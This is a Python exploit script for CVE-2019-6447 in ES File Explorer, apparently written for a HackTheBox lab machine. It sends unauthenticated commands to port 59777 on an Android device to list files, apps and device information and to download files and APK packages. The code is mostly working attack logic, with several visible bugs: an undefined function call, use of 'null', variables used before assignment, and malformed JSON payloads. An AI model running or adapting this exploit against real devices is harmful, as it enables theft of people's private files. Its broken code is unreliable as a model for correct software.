
import requests
import sys
import os
import argparse
import json
import re

##################################################################################################
#   Python script for retrieving files, apps, and device information from an Android device
#   Android device must be running ES File Server 
#   This script relies on the ES File Server vulnerability (CVE-2019-6447)
#
#   This script is used for penetration testing purposes on deliberately vulnerable machines
#   on sites such as HackTheBox and TryHackMe
#
#   This script is loosely based on the following scripts, cited below:
#   
#
#   
#   https://github.com/fs0c131y/ESFileExplorerOpenPortVuln/blob/master/poc.py
#   
#   and
#   
#
#   https://www.exploit-db.com/exploits/50070
#
#
##################################################################################################



cmd_options = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','listAppsThumbnail','getDeviceInfo']
get_file_options = ['getFile']
app_pull_options = ['appPull']

machine_name="Explore_HtB_Android"
recon_filenames = {cmd_name: machine_name + "_" + cmd_name.split('list')[1] + ".txt" for cmd_name in cmd_options if "list" in cmd_name}
#recon_filenames['getDeviceInfo'] = machine_name + "_DeviceInfo.txt"

post_headers = {"Content-Type": "application/json"}
get_headers = {"Content-Type": "text/plain"}

addr='10.10.10.247'

url='http://'+ addr + ':59777'

total_filelist = []

formatted_json_response = ""
json_obj = dict()
#folder_contents=dict()
root_folder_contents=dict()
app_packages_json_obj = dict()

### Python split() to remove square brackets at start and end of string, used for correct formatting so that the string can be parsed by json.loads without error
### Splits string using delimiter [ and takes the element at position 1 (everything after opening square bracket "[")
### And then splits string again using same technique, but this time with element at position 0 because the closing square bracket is trailing the rest of the string
def format_json(json_response):
    formatted_json = json_response.replace("\'", "\"")
    formatted_json = formatted_json.split("[")[1].split("]")[0]
    formatted_json = re.sub(',\s+}', '}', formatted_json)
    formatted_json = "[" + formatted_json +"]" 
    return formatted_json


def app_pull(app_name):
    req_addr = url + "/" + app_name
    app_pull_payload_data = '{"command":' + "appPull" + ', "appPackageName":'+ app_name + '}'
    res = requests.post(req_addr, headers=post_headers, data=app_pull_payload_data, verify=False)
    retrieved_app= machine_name + "_" + app_name + ".apk"
    #print("Retrieved file name: ", retrieved_file, "\n")
    if res.status_code == 200:
        with open(retrieved_app, 'wb') as f:
            f.write(res.content)
        print("File retrieved! Enjoy...")
    else:
        print("Something went wrong. Here's the response status code: ", res.status_code)


def fetch_android_file(machine_name, filename):
    req_addr = url + "/" + filename
    res = requests.get(req_addr, headers=get_headers, verify=False)
    #renamed_filename_dir, renamed_filename = filename.lstrip('/').split('/')
    renamed_filename_full = filename.lstrip('/').split('/')
    renamed_filename_dir, renamed_filename = renamed_filename_full[-2], renamed_filename_full[-1]
    ##retrieved_file = machine_name + "_" + filename
    retrieved_file = machine_name + "_" + renamed_filename_dir + "_" + renamed_filename
    #print("Retrieved file name: ", retrieved_file, "\n")
    if res.status_code == 200:
        with open(retrieved_file, 'wb') as f:
            f.write(res.content)
        print("File retrieved! Enjoy...")
    else:
        print("Something went wrong. Here's the response status code: ", res.status_code)


def get_all_files(machine_name, current_dir, file_list):
    for file_elem in file_list:
        filename = file_elem["name"]
        print("Retrieving file:", filename)
        full_filename= current_dir + filename
        if file_elem["type"] == "file":
            print("Full filename with path:", full_filename)
            fetch_android_file(machine_name, full_filename)
        else:
            print("That's not a valid file. I'll skip it.")

###
# Functions to create graph of filesystem of remote Android device
# function create_graph takes two parameters: 
# edges - a list of edges (from parent dir to child node, where child node is an elem of directory listing)
# n -- the number of edges in the graph, or the number of items in the entire filesystem
# 
# function DFS_find_root_dir takes three parameters:
# graph - the dictionary, returned by function create_graph, that contains all files/directories in the filesystem and their connections
# start - the starting vertex of the DFS; the initial value of start is "/" for the root of the filesystem
# visited - the list of all visited nodes in the graph (all visited directories in the filesystem)
#
# create_graph creates an empty dictionary for all nodes and edges in the graph of the filesystem,
# populates that dictionary with all files in filesystem and their connections between directories
# create_graph returns the complete dictionary (graph) of root filesystem
#
#
#
###

def generate_graph_edges(root_fs_dict, n):
    edges = {}
    for k, v in root_fs_dict.items():
        if k not in edges:
            edges[k] = []
            for elem in v:
                if elem not in edges[k]:
                    new_v = elem['name']
                    edges[k].append(new_v)
                    if new_v not in edges:
                        edges[new_v] = []
    print("Edges: ", edges)
    return edges

def create_graph(edges, n):
    graph = {}
    for i in range(1, n+1):
        graph[i] = []
    for edge in edges:
        start_node = edge[0]
        dest_node = edge[1]
        graph[start_node].append(dest_node)
        graph[dest_node].append(start_node)
    print("Graph: ", graph)
    return graph

def DFS_find_root_dir(graph, start, visited):
    visited[start] = True
    if start not in graph:
        return set(visited.keys())
    if graph[start] == []:
        return set(visited.keys())
    for neighbor in graph[start]:
        #if neighbor not in visited:
        if neighbor not in visited:
            DFS(graph, neighbor, visited)
    return set(visited.keys())


def retrieve_files_from_folders(total_filelist, folder_dict, current_dir):
    cmd = "listFiles"
    payload_data = '{"command":' + cmd + '}'
    print("Current directory: ", current_dir)
    #total_filelist=folder_dict
    filelist=[file_elem for file_elem in total_filelist if (file_elem["type"] == "file")]
    print("Filelist: ", filelist)
    folderlist=[folder_elem for folder_elem in total_filelist if (folder_elem["type"] == "folder")]
    print("Folderlist: ", folderlist)
    print("Folder dict: ", folder_dict)
    #print("Initial folder dict: ", total_filelist)
    folder_count = 0
    num_folders=len(folderlist)
    folder_indices={i: "" for i in range(num_folders)}
    ##folder_dict_search=folder_dict[current_dir]
    ##print("folder dict to search:", folder_dict_search)
    for folder in folderlist:
    #for k, v in folder_dict_search if k in folderlist:
    #for folder in folder_dict:
        foldername = folder["name"]
        print("Foldername: ", foldername, "\n")
        folder_indices[folder_count] = foldername
        folder_count+=1
        #req_addr = url + "/" + foldername
        req_addr = url + current_dir + foldername
        res = requests.post(req_addr, headers=post_headers, data=payload_data)
        #retrieved_folder_filelist = machine_name + "_" + foldername + "_filelist.txt"
        print("Folder from which to retrieve files: ", folder)
        if res and res.status_code == 200: 
            res_text=res.text
            formatted_json_response = format_json(res_text)
            folder_json_obj=json.loads(formatted_json_response)
            ##folder_dict[foldername]=folder_json_obj
            folder_dict.update({foldername: folder_json_obj})
#                with open(retrieved_folder_filelist,'wb') as f:
#                    res_text=res.text
#                    formatted_json_response = format_json(res_text)
#                    folder_json_obj=json.loads(formatted_json_response)
#                    folder_contents[foldername]=folder_json_obj
#                    ##print("formatted json response using json.loads: ", json_obj, "\n")
#                    formatted_json_bytearray=formatted_json_response.encode("utf-8") 
#                    f.write(formatted_json_bytearray)
#    folder_count = 0
#    num_folders=len(folderlist)
#    folder_indices={i: "" for i in range(num_folders)}
#    for folder in folderlist:
#        foldername=folder["name"]
#        print("Foldername: ", foldername, "\n")
#        folder_indices[folder_count] = foldername
#        folder_count+=1
    print("Folder indices: ", folder_indices)
    folder_index_cmd_choices = folder_indices.values()
    print("Which folder would you like to retrieve files from?\n Enter an integer in the range 0-{folder_count}\n".format(folder_count=folder_count))
    folder_index = int(input())
    print("Folder index chosen: ", folder_index)
    folder_chosen = folder_indices[folder_index]
    print("Folder chosen: ", folder_chosen)
    #folder_filelist=folder_dict[folder_chosen]
    total_content_folder=folder_dict[folder_chosen]
    print("Contents of chosen folder: ", total_content_folder, "\n")
    folder_filelist=[elem for elem in total_content_folder if (elem["type"] == "file")]
    folder_subfolderlist=[elem for elem in total_content_folder if (elem["type"] == "folder")]

    file_count = 0
    num_files=len(folder_filelist)
    num_subfolders=len(folder_subfolderlist)
    file_indices={i: "" for i in range(num_files)}
    subfolder_indices={i: "" for i in range(num_subfolders)}
    for file in folder_filelist:
        filename=file["name"]
        print("Filename: ", filename, "\n")
        file_indices[file_count] = filename
        file_count+=1
    print("File indices: ", file_indices)
    file_index_cmd_choices = file_indices.values()
    new_dir=current_dir + folder_chosen + "/"
    print("Would you like to get the listing of a subdirectory in the current folder or only one file from the current folder?\n Enter A for subdirectory listing, B for all files from current folder, or C for a single file from current folder.\n")
    choice = str(input())
    print("Choice: ", choice, "\n")
    if ((choice == "A") or (choice == "a")):
        print("Okay, retrieving contents of specified subdirectory.")
        #subfolder_json=dict()
        subfolder_json=folder_dict[folder_chosen]
        print("Current directory: ", new_dir)
        print("Subfolder json: ", subfolder_json)
        #retrieve_files_from_folders(folder_json_obj, total_content_folder, current_dir)
        #retrieve_files_from_folders(subfolder_json, total_content_folder, current_dir)
        ##retrieve_files_from_folders(subfolder_json, total_content_folder, new_dir)
        retrieve_files_from_folders(subfolder_json, folder_dict, new_dir)
        #get_all_files(machine_name, filelist)
    elif ((choice == "B") or (choice == "b")):
        print("Okay, hang on while I fetch those files for you.")
        get_all_files(machine_name, new_dir, folder_filelist)
    elif ((choice == "C") or (choice == "c")):
        print("Which file(s) would you like to retrieve?")
        file_index = int(input())
        print("File index chosen: ", file_index)
        file_chosen = folder_chosen + "/" + file_indices[file_index]
        print("File chosen: ", file_chosen)
        print("Retrieving file...")
        fetch_android_file(machine_name, file_chosen)
    else:
        print("I'm sorry, you've entered an invalid choice. Best wishes. Warmest regards.")



def setup_options():
    parser = argparse.ArgumentParser(description='Retrieve files from an Android device, exploiting the ES File Explorer vulnerability (CVE-2019-6447)')
    parser.add_argument('-cmd', nargs=1, choices=cmd_options, default=cmd_options[0], help='The command to be executed on the ES File Explorer')
    parser.add_argument('-ip', nargs='?', default=addr,  help='IP address of target machine')
    subparsers = parser.add_subparsers()
    parser.add_argument('-getfiles', action="store_true",  help='Option to retrieve file or files from generated list of all files on target device')
    parser.add_argument('-appPull', action="store_true",  help='Option to retrieve app file (APK) from generated list of all apps on target device')
    args = parser.parse_args()
    return parser, args

def invoke_command():
    main_parser, args = setup_options()
    cmd=args.cmd[0]
    getfile_cmd=args.getfiles
    app_pull_cmd=args.appPull
    payload_data = '{"command":' + cmd + '}'
    print("args:", args)
    print("cmd:", cmd)
    print("Get file args:", getfile_cmd)
    print("Recon filenames: ", recon_filenames, "\n")

    if cmd:
        if cmd == 'listFiles':
            print("listFiles command successfully received")
            res = requests.post(url, headers=post_headers, data=payload_data)
            if res and res.status_code == 200: 
                with open("file_list.txt",'wb') as f:
                    res_text=res.text
                    ### Referencing this StackOverflow article for formatting of sanitized JSON to be passed to JSON parser with json.loads:
                    ###
                    ### https://stackoverflow.com/questions/39491420/python-jsonexpecting-property-name-enclosed-in-double-quotes
                    formatted_json_response = format_json(res_text)
                    json_obj=json.loads(formatted_json_response)
                    root_folder_contents["/"]=json_obj 
                    ##print("formatted json response using json.loads: ", json_obj, "\n")
                    formatted_json_bytearray=formatted_json_response.encode("utf-8") 
                    f.write(formatted_json_bytearray)
        elif cmd in recon_filenames:
            cmd_filename=recon_filenames[cmd]
            print("cmd filename: ", cmd_filename, "\n")
            res = requests.post(url, headers=post_headers, data=payload_data)
            if res and res.status_code == 200: 
                with open(cmd_filename,'wb') as f:
                    res_text=res.text
                    if (cmd == "listAppsAll"):
                        app_packages_json_obj=json.loads(res_text)
                        ##print("formatted json response using json.loads: ", app_packages_json_obj, "\n")
                    formatted_json_bytearray=res_text.encode("utf-8") 
                    f.write(formatted_json_bytearray)
                    print("Response content: ", res_text, "\n")
        elif cmd == 'getDeviceInfo':
            device_info_file = machine_name + "_" + "DeviceInfo.txt"
            res = requests.post(url, headers=post_headers, data=payload_data)
            if res and res.status_code == 200: 
                with open(device_info_file,'wb') as f:
                    res_content=res.content
                    f.write(res_content)
                    print("Device Info: ", res_content, "\n")
        elif cmd == 'appLaunch':
            #if[recon_filenames['listApps'] != null:
            app_list = dict()
            if (app_packages_json_obj.keys() != null):
                app_count = 0
                num_apps=len(applist)
                app_indices={i: "" for i in range(num_apps)}
                for app in app_list:
                    app_name = app["name"]
                    print("Foldername: ", app_name, "\n")
                    app_indices[app_count] = app_name
                    app_count+=1
            else:
                print("Let me generate the list of apps on the device. One moment...")

            print("Which app would you like to launch?\n")

            app_index = int(input())
            print("Folder index chosen: ", app_index)
            app_chosen = app_indices[app_index]
            print("Folder chosen: ", app_chosen)
            app_name = app_chosen
            app_launch_payload_data = '{"command":' + "appLaunch" + ', "appPackageName":'+ app_name + '}'
            
            res = requests.post(url, headers=post_headers, data=payload_data)
            print("App launched. What fun.")
        else:
            if getfile_cmd:
                root_filelist=json_obj
                retrieve_files_from_folders(root_filelist, root_folder_contents, "/")

            if app_pull_cmd:
                total_app_list=app_packages_json_obj
                print("All apps on target device: ", total_app_list, "\n")
                applist=[app_elem for app_elem in total_app_list]
                print("List of app names: ", applist, "\n")
                app_count = 0
                num_apps=len(applist)
                app_indices={i: "" for i in range(num_apps)}
                for app in applist:
                    appname=app["packageName"]
                    print("App package name: ", appname, "\n")
                    app_indices[app_count] = appname
                    app_count+=1
                print("App package indices: \n\n")
                for k,v in app_indices.items():
                    print("Index: ", k, "Package name: ", v)
                #app_index_cmd_choices = app_indices.values()
                
                print("Which app would you like to pull from the device?")
                app_choice=int(input())
                if (0 <= app_choice <= num_apps):
                    app_chosen = app_indices[app_choice]
                    print("App chosen: ", app_chosen)
                    app_pull(app_chosen)

        print("root folder contents:", root_folder_contents)
        n_root_dir = len(root_folder_contents.keys())
        graph_edges=generate_graph_edges(root_folder_contents,n_root_dir)
        #graph = create_graph(root_folder_contents, n_root_dir)


if __name__ == '__main__':
    invoke_command()
